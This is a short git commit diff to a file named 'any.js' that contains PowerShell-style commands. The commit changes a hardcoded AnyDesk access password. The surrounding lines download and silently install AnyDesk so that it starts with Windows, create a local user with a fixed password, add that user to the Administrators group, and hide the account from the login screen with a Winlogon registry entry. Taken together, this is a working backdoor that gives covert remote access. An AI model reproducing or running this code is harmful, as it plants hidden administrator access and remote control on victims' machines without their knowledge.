65c1ea82a5b3093bbd1dba064b1a226b8fd1abb2
lilbuno1 <102577859+lilbuno1@users.noreply.github.com>
2022-05-03 00:44:38 -0700

    Update any.js

--- any.js
+++ any.js
@@ -5,7 +5,7 @@ Function AnyDesk {
         $file = "C:\ProgramData\AnyDesk.exe"
         $clnt.DownloadFile($url,$file)
         cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
-        cmd.exe /c echo shinoany | C:\ProgramData\AnyDesk\anydesk.exe --set-password
+        cmd.exe /c echo shinoany123@a! | C:\ProgramData\AnyDesk\anydesk.exe --set-password
         net user shinobabie 270795123@a! /add
         net localgroup administrators shinobabie /add
         reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v shinobabie /t REG_DWORD /d 0 /f
